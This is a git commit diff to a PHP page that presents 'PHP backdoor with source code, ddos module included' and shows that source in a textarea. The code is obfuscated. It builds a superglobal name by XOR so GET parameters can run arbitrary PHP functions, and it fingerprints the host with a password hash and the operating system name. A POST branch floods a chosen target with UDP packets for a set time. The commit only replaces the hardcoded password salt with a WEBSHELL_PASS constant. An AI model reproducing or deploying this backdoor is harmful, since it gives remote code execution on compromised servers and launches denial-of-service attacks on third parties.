2b8f9a9daef8fd73049374f3a4bc69bc5d604f35
Andrea Draghetti <drego85@draghetti.it>
2015-12-26 22:33:16 +0100

    Test

--- home/index.php
+++ home/index.php
@@ -74,10 +74,11 @@ print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
                             Current PHP backdoor with source code, ddos module included (not necessary)
                             </p>
 				<textarea style="border: none" rows="15" cols="80">
+					<?php echo WEBSHELL_PASS; ?>
 date_default_timezone_set('Europe/London');
 if($_GET['_']) {
 print "<?php echo htmlspecialchars('<!--'); ?>".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
-print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
+print "{:|".md5("<?php echo WEBSHELL_PASS; ?>".date("h:d"))."{:|".PHP_OS."{:|-->";
 } elseif($_GET['___']) { @$_GET['___'](); } elseif(isset($_POST['target'])&&isset($_POST['time'])){$fn0=0;$pm1=$_POST['time'];$yu2=time();$az3=$yu2+$pm1;$jd4=$_POST['target'];$kb5=gethostbyname($jd4);for($pt6=0;$pt6<65553;$pt6++){$yf7.='X';}while(1){$fn0++;if(time()>$az3){break;}$yw8=rand(1,65553);$vl9=fsockopen('udp://'.$kb5,$yw8,$ic10,$yf11,5);if($vl9){fwrite($vl9,$yf7);fclose($vl9);}}}elseif($_POST['kill']=='1'){exit(0);}
 				</textarea>
 
